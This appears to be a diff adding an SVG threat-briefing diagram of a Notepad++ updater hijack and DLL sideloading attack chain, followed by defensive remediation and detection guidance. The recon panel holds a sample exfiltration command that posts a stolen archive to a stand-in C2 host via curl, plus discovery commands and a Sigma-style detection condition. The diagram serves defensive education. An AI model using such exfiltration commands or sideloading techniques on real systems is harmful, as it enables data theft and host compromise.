@@ -1,0 +1,177 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 830" width="100%" height="100%">
+  <defs>
+    <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" stop-color="#0b0f19"/>
+      <stop offset="100%" stop-color="#111827"/>
+    </linearGradient>
+    <linearGradient id="cardGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+      <stop offset="0%" stop-color="#1e293b"/>
+      <stop offset="100%" stop-color="#0f172a"/>
+    </linearGradient>
+    <linearGradient id="redCard" x1="0%" y1="0%" x2="0%" y2="100%">
+      <stop offset="0%" stop-color="#2d151e"/>
+      <stop offset="100%" stop-color="#1f1118"/>
+    </linearGradient>
+    <linearGradient id="greenCard" x1="0%" y1="0%" x2="0%" y2="100%">
+      <stop offset="0%" stop-color="#064e3b"/>
+      <stop offset="100%" stop-color="#022c22"/>
+    </linearGradient>
+    <filter id="shadow" x="-5%" y="-5%" width="110%" height="110%">
+      <feDropShadow dx="0" dy="4" stdDeviation="6" flood-color="#000000" flood-opacity="0.5"/>
+    </filter>
+  </defs>
+
+  <!-- Background -->
+  <rect width="1200" height="830" fill="url(#bgGrad)"/>
+
+  <!-- Title & Subtitle -->
+  <text x="600" y="42" text-anchor="middle" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="24" font-weight="700" fill="#f8fafc">Notepad++ GUP Updater Hijacking &amp; DLL Sideloading Architecture</text>
+  <text x="600" y="68" text-anchor="middle" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="13" fill="#94a3b8">Targeted software-delivery interception, DLL hijacking, reconnaissance staging, and Authenticode defenses</text>
+
+  <!-- 3 Stages Side-by-Side -->
+
+  <!-- Panel 1: Update Interception -->
+  <g transform="translate(40, 95)" filter="url(#shadow)">
+    <rect width="350" height="390" rx="10" fill="url(#redCard)" stroke="#f87171" stroke-width="1.5"/>
+    <rect x="0" y="0" width="350" height="42" rx="10" fill="#991b1b" fill-opacity="0.3"/>
+    <text x="20" y="26" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="14" font-weight="700" fill="#fca5a5">1. Update Traffic Interception</text>
+
+    <!-- Sub-card 1 -->
+    <rect x="16" y="55" width="318" height="85" rx="6" fill="#1e293b" stroke="#334155" stroke-width="1"/>
+    <text x="26" y="75" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="11" font-weight="700" fill="#38bdf8">GUP (Generic Updater) Trigger</text>
+    <text x="26" y="93" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">Notepad++ spawns updater/gup.exe on startup</text>
+    <text x="26" y="108" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">Requests update.xml manifest over network.</text>
+    <text x="26" y="123" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="9.5" fill="#fca5a5">Insecure channel / unpinned endpoint</text>
+
+    <!-- Connector -->
+    <path d="M 175 140 L 175 155" stroke="#f87171" stroke-width="2"/>
+
+    <!-- Sub-card 2 -->
+    <rect x="16" y="155" width="318" height="110" rx="6" fill="#1e293b" stroke="#334155" stroke-width="1"/>
+    <text x="26" y="175" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="11" font-weight="700" fill="#fbbf24">Targeted MITM / DNS Poisoning</text>
+    <text x="26" y="193" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">Adversary intercepts update request via:</text>
+    <text x="26" y="208" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">• Targeted ISP-level traffic redirection</text>
+    <text x="26" y="223" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">• Rogue / compromised intermediate CA</text>
+    <text x="26" y="243" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="9.5" fill="#fca5a5">Selectively targets high-value individual users</text>
+
+    <!-- Connector -->
+    <path d="M 175 265 L 175 280" stroke="#f87171" stroke-width="2"/>
+
+    <!-- Sub-card 3 -->
+    <rect x="16" y="280" width="318" height="95" rx="6" fill="#450a0a" stroke="#ef4444" stroke-width="1"/>
+    <text x="26" y="300" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="11" font-weight="700" fill="#fca5a5">Forged Update Manifest Returned</text>
+    <text x="26" y="318" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#fecaca">• Points download URL to attacker C2 host</text>
+    <text x="26" y="333" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#fecaca">• Delivers trojanized installer zip / binary</text>
+    <text x="26" y="348" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#fecaca">• GUP lacked signature verification!</text>
+  </g>
+
+  <!-- Panel 2: DLL Sideloading -->
+  <g transform="translate(425, 95)" filter="url(#shadow)">
+    <rect width="350" height="390" rx="10" fill="url(#redCard)" stroke="#f87171" stroke-width="1.5"/>
+    <rect x="0" y="0" width="350" height="42" rx="10" fill="#991b1b" fill-opacity="0.3"/>
+    <text x="20" y="26" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="14" font-weight="700" fill="#fca5a5">2. DLL Sideloading &amp; Memory Injection</text>
+
+    <!-- Sub-card 1 -->
+    <rect x="16" y="55" width="318" height="85" rx="6" fill="#1e293b" stroke="#334155" stroke-width="1"/>
+    <text x="26" y="75" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="11" font-weight="700" fill="#fbbf24">Malicious Proxy DLL Dropped</text>
+    <text x="26" y="93" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">Attacker places crafted DLL alongside legitimate</text>
+    <text x="26" y="108" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">signed executable in application directory.</text>
+    <text x="26" y="123" font-family="monospace" font-size="9.5" fill="#38bdf8">libcurl.dll / certutil.dll proxying</text>
+
+    <!-- Connector -->
+    <path d="M 175 140 L 175 155" stroke="#f87171" stroke-width="2"/>
+
+    <!-- Sub-card 2 -->
+    <rect x="16" y="155" width="318" height="110" rx="6" fill="#1e293b" stroke="#334155" stroke-width="1"/>
+    <text x="26" y="175" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="11" font-weight="700" fill="#f87171">Windows DLL Search Order Abuse</text>
+    <text x="26" y="193" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">Application loads DLL from local folder before</text>
+    <text x="26" y="208" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">checking System32 directory:</text>
+    <text x="26" y="223" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#fca5a5">• Legitimate binary acts as execution host</text>
+    <text x="26" y="243" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="9.5" fill="#94a3b8">Blends in with standard task manager processes</text>
+
+    <!-- Connector -->
+    <path d="M 175 265 L 175 280" stroke="#f87171" stroke-width="2"/>
+
+    <!-- Sub-card 3 -->
+    <rect x="16" y="280" width="318" height="95" rx="6" fill="#450a0a" stroke="#ef4444" stroke-width="1"/>
+    <text x="26" y="300" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="11" font-weight="700" fill="#fca5a5">Shellcode Execution in Memory</text>
+    <text x="26" y="318" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#fecaca">• Unpacks encrypted shellcode payload</text>
+    <text x="26" y="333" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#fecaca">• Injects backdoor thread into Notepad++</text>
+    <text x="26" y="348" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#fecaca">• Connects outbound beacon to C2 network</text>
+  </g>
+
+  <!-- Panel 3: Hands-on Reconnaissance -->
+  <g transform="translate(810, 95)" filter="url(#shadow)">
+    <rect width="350" height="390" rx="10" fill="url(#cardGrad)" stroke="#f59e0b" stroke-width="1.5"/>
+    <rect x="0" y="0" width="350" height="42" rx="10" fill="#b45309" fill-opacity="0.3"/>
+    <text x="20" y="26" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="14" font-weight="700" fill="#fef3c7">3. Hands-on Recon &amp; Exfiltration</text>
+
+    <!-- Sub-card 1 -->
+    <rect x="16" y="55" width="318" height="85" rx="6" fill="#0f172a" stroke="#334155" stroke-width="1"/>
+    <text x="26" y="75" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="11" font-weight="700" fill="#fbbf24">Living-off-the-Land Discovery</text>
+    <text x="26" y="93" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">Actors execute native Windows discovery tools:</text>
+    <text x="26" y="108" font-family="monospace" font-size="10" fill="#fca5a5">whoami /groups &amp;&amp; systeminfo</text>
+    <text x="26" y="123" font-family="monospace" font-size="10" fill="#fca5a5">netstat -ano &amp;&amp; tasklist /v</text>
+
+    <!-- Connector -->
+    <path d="M 175 140 L 175 155" stroke="#f59e0b" stroke-width="2"/>
+
+    <!-- Sub-card 2 -->
+    <rect x="16" y="155" width="318" height="110" rx="6" fill="#0f172a" stroke="#334155" stroke-width="1"/>
+    <text x="26" y="175" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="11" font-weight="700" fill="#38bdf8">Staging Data Exfiltration via curl</text>
+    <text x="26" y="193" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">Attacker invokes built-in curl.exe utility:</text>
+    <text x="26" y="208" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">• Gathers source code &amp; proprietary files</text>
+    <text x="26" y="223" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">• Posts encrypted archives to drop site</text>
+    <text x="26" y="243" font-family="monospace" font-size="9" fill="#fca5a5">curl -F "f=@stolen.zip" https://c2.actor/</text>
+
+    <!-- Connector -->
+    <path d="M 175 265 L 175 280" stroke="#f59e0b" stroke-width="2"/>
+
+    <!-- Sub-card 3 -->
+    <rect x="16" y="280" width="318" height="95" rx="6" fill="#1e293b" stroke="#475569" stroke-width="1"/>
+    <text x="26" y="300" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="11" font-weight="700" fill="#ef4444">Persistent Host Compromise</text>
+    <text x="26" y="318" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">• Backdoor persists across reboot cycles</text>
+    <text x="26" y="333" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">• Sideloaded binary evades basic AV detection</text>
+    <text x="26" y="348" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10" fill="#cbd5e1">• Direct threat to software developer machines</text>
+  </g>
+
+  <!-- Bottom Panel: Hardening, Authenticode Defenses & EDR Monitoring -->
+  <g transform="translate(40, 510)" filter="url(#shadow)">
+    <rect width="1120" height="280" rx="10" fill="url(#cardGrad)" stroke="#10b981" stroke-width="1.5"/>
+    <rect x="0" y="0" width="1120" height="40" rx="10" fill="#047857" fill-opacity="0.3"/>
+    <text x="24" y="25" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="14" font-weight="700" fill="#a7f3d0">Defensive Remediation: Notepad++ Updater Overhaul, Authenticode Validation &amp; EDR Detection</text>
+
+    <!-- Sub-panel 1: Application-Level Fix -->
+    <rect x="24" y="55" width="330" height="205" rx="8" fill="#1e293b" stroke="#334155" stroke-width="1"/>
+    <text x="40" y="78" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="12" font-weight="700" fill="#38bdf8">1. Notepad++ v8.6.9+ / v8.8.8 Fix</text>
+    <text x="40" y="100" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10.5" fill="#cbd5e1">• Mandatory HTTPS for all update endpoints</text>
+    <text x="40" y="120" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10.5" fill="#cbd5e1">• Domain pinning: notepad-plus-plus.org strictly</text>
+    <text x="40" y="140" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10.5" fill="#cbd5e1">• WinVerifyTrust Authenticode signature check</text>
+    <text x="40" y="160" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10.5" fill="#cbd5e1">• SHA-256 hash matching against signed manifest</text>
+    <rect x="40" y="185" width="298" height="55" rx="4" fill="#0f172a" stroke="#475569" stroke-width="1"/>
+    <text x="50" y="205" font-family="monospace" font-size="10" fill="#86efac">Enforce v8.8.8+ globally across fleet</text>
+    <text x="50" y="223" font-family="monospace" font-size="10" fill="#38bdf8">Verify WinGup certificate pinning</text>
+
+    <!-- Sub-panel 2: DLL Sideloading Mitigation -->
+    <rect x="374" y="55" width="350" height="205" rx="8" fill="#1e293b" stroke="#334155" stroke-width="1"/>
+    <text x="390" y="78" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="12" font-weight="700" fill="#a78bfa">2. Windows OS DLL Hardening</text>
+    <text x="390" y="100" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10.5" fill="#cbd5e1">• Enable safe search mode: SetSearchPathMode()</text>
+    <text x="390" y="120" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10.5" fill="#cbd5e1">• Mandate LoadLibraryEx with SYSTEM32 search</text>
+    <text x="390" y="140" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10.5" fill="#cbd5e1">• Enable AppLocker / WDAC DLL validation</text>
+    <text x="390" y="160" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10.5" fill="#cbd5e1">• Restrict user write permissions to Program Files</text>
+    <rect x="390" y="185" width="318" height="55" rx="4" fill="#0f172a" stroke="#475569" stroke-width="1"/>
+    <text x="400" y="205" font-family="monospace" font-size="9.5" fill="#a78bfa">reg add "HKLM\System\...\Session Manager"</text>
+    <text x="400" y="223" font-family="monospace" font-size="9.5" fill="#a78bfa">  /v CWDIllegalInDllSearch /d 2 /f</text>
+
+    <!-- Sub-panel 3: EDR / SIEM Detection Rules -->
+    <rect x="744" y="55" width="350" height="205" rx="8" fill="#1e293b" stroke="#334155" stroke-width="1"/>
+    <text x="760" y="78" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="12" font-weight="700" fill="#4ade80">3. EDR / Sysmon Behavioral Alerts</text>
+    <text x="760" y="100" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10.5" fill="#cbd5e1">• Flag notepad++.exe or gup.exe spawning shells</text>
+    <text x="760" y="120" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10.5" fill="#cbd5e1">• Alert on child processes: cmd, powershell, curl</text>
+    <text x="760" y="140" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" font-size="10.5" fill="#cbd5e1">• Monitor unsigned DLL loads in Notepad++ PID</text>
+    <rect x="760" y="165" width="318" height="75" rx="4" fill="#064e3b" stroke="#10b981" stroke-width="1"/>
+    <text x="770" y="185" font-family="monospace" font-size="10" fill="#86efac">Sigma Rule Condition:</text>
+    <text x="770" y="203" font-family="monospace" font-size="10" fill="#86efac">ParentImage endswith '\notepad++.exe'</text>
+    <text x="770" y="221" font-family="monospace" font-size="10" fill="#86efac">and Image in ['cmd.exe', 'curl.exe']</text>
+  </g>
+</svg>
